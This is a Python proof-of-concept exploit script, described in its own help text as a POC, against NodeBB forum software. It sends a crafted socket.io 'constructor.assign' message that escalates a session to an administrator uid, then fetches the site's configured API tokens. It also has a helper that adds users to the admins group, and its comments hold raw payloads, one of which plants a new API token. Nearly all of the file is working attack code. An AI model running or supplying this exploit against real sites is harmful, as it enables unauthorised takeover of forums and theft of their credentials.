#!/usr/bin/env python3 
import requests 
import random
import string
import json
import sys
import argparse

class MyParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write('error: %s\n' % message)
        self.print_help()
        sys.exit(2)


requests.packages.urllib3.disable_warnings()

class NodeBBAuthBypasser:

    def __init__(self, basedomain, http=False, proxies={}, target_uid=1, debug=False):
        self.priv_target_uid = target_uid
        self.session = None
        self.proxies = proxies
        self.site = '{}://{}/'.format('http' if http else 'https', basedomain)
        self.socketiopath = 'socket.io/' 
        self.socketioparams = {'EIO' : '4', 'transport' : 'polling', 't' : ''}
        self.headers = {'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0'}
        self.token = None
        self.sid = None
        self.cookie = None
        self.mid = 1
        self.session_escalated = False
        self.debug = debug


    def _gen_token(self):
        '''Generate random token for socket.io session'''
        self.token = ''.join(random.choice(string.ascii_letters) for i in range(6))


    def set_express_cookie(self, cookie):
        '''Set an express.sid session id cookie to use for the session'''
        self.cookie = {'express.sid': cookie}


    def start_session(self):
        '''Setup a HTTP request session and a socket.io session'''
        self.mid = 1
        self.session = requests.Session()
        self.session.proxies = self.proxies
        if 'https' in self.proxies:
            self.session.verify = False
        
        # setup cookies for session
        if self.cookie: # used provided cookie
            self.session.cookies.update(self.cookie)
        else: # get a new one
            r = self.session.get(self.site, headers=self.headers)
            if not r.status_code == 200:
                raise Exception('Bad response from server to session setup: {}'.format(r.content.decode()))
        params = dict(self.socketioparams)
        self._gen_token()
        params['t'] = self.token

        # setup socket.io http "socket"
        r = self.session.get('{}{}'.format(self.site, self.socketiopath), params=params, headers=self.headers)
        if not r.status_code == 200:
            raise Exception('Bad response to socketio setup: {}'.format(r.content.decode()))
        
        # handshake
        rd = r.content.decode()
        self.sid = json.loads(rd[1:])['sid']
        headers = dict(self.headers)
        headers['Content-Type'] = 'text/plain;charset=UTF-8'
        params = dict(self.socketioparams)
        params['t'] = self.token 
        params['sid'] = self.sid
        
        r = self.session.post('{}{}'.format(self.site, self.socketiopath), headers = headers, params=params, data='40')
        if r.status_code != 200:
            raise Exception('Error in handshake: {}'.format(r.content.decode()))
        
        self.session.get('{}{}'.format(self.site, self.socketiopath), params=params, headers=self.headers)
        if r.status_code != 200:
            raise Exception('Error in handshake response: {}'.format(r.content.decode()))
        
        # escalate
        self._run_privesc()
        
    def _run_privesc(self):
        '''Send message to escalate privilges in socket to provided uid'''
        params = dict(self.socketioparams)
        params['t'] = self.token 
        params['sid'] = self.sid
        data = '42*REPLACE_MID*["constructor.assign",{"uid":*REPLACE_UID*}]'.replace('*REPLACE_UID*', str(self.priv_target_uid)).replace('*REPLACE_MID*', str(self.mid))
        r = self.session.post('{}{}'.format(self.site, self.socketiopath), headers = self.headers, params=params, data=data)
        if r.status_code != 200:
            raise Exception('Error in running privesc: {}'.format(r.content.decode()))
        self.session_escalated = True
        self.mid += 1


    def _call_function(self, data):
        '''Helper function to call '''            
        params = dict(self.socketioparams)
        params['t'] = self.token 
        params['sid'] = self.sid
        r = self.session.post('{}{}'.format(self.site, self.socketiopath), headers = self.headers, params=params, data=data)
        if r.status_code != 200:
            raise Exception('Error in calling function: {}'.format(r.content.decode()))
        r = self.session.get('{}{}'.format(self.site, self.socketiopath), params=params, headers=self.headers)
        if r.status_code != 200:
            raise Exception('Error in receiving response to called function: {}'.format(r.content.decode()))
        return r.content


    def get_timestamp(self):
        data = '42*REPLACE*["admin.getServerTime"]'.replace('*REPLACE*', str(self.mid))
        self.mid +=1
        return self._call_function(data)


    def get_tokens(self):
        data = '42*REPLACE*["admin.settings.get",{"hash": "core.api"}]'.replace('*REPLACE*', str(self.mid))
        self.mid +=1
        return self._call_function(data)

    def add_admins(self, uids):
        params = str([int(a) for a in uids])
        data = '42*REPLACE*"admin.user.makeAdmins", *PARAMS*]'.replace('*REPLACE*', str(self.mid)).replace('*PARAMS*', params)
        self.mid +=1
        return self._call_function(data)




# Some example socket.io calls
# admin function to check time
#425["admin.getServerTime"]
# set the api keys
#422["admin.settings.set",{"hash":"core.api","values":{"tokens":[{"description":"Added by hacking","timestamp":"","token":"12af1039-acd5-4d3e-ad50-37bf6d7bb163","uid":1}],"requireHttps":"off"}}]
# get the api keys
#424["admin.settings.get",{"hash": "core.api"}]
# add some users by uid to the admins group
#421["admin.user.makeAdmins", [2]]
# user function to get user details by uid, admin not required
# #422["user.getUserByUID",1]


if __name__ == "__main__":
    parser = MyParser()
    parser.epilog = "Example usage: {} -d try.nodebb.org -c [express.sid_cookie_value]".format(sys.argv[0])
    parser.description = 'POC exploit to create a NodeBB socket.io session and escalate to admin and obtain any configured api tokens. If the 2factor plugin is enabled you need to provide a cookie value for a logged on user.'
    parser.add_argument('-d', '--domain', type=str, required=True, help='Host and port to connect to')
    parser.add_argument('-p', '--proxies', type=str, default=None, help='Proxy server to use for the connection. Default: none')
    parser.add_argument('-c', '--cookie', type=str, default=None, help='Cookie value for express.sid cookie to escalate associated with an existing http logon session')
    parser.add_argument('-u', '--uid', type=int,  default=1, help='The target uid to use for the privesc. Default: 1')
    parser.add_argument('-n', '--http', action='store_true', default=False, help='Send request using http instead of https')
    args = parser.parse_args()
    if args.proxies:
        proxies = {'http' : args.proxies, 'https' : args.proxies}
    else:
        proxies = {}

    bypasser = NodeBBAuthBypasser(args.domain, http=args.http, proxies=proxies, target_uid=args.uid)
    if args.cookie:
        bypasser.set_express_cookie(args.cookie)
    bypasser.start_session()

    print(bypasser.get_tokens().decode())
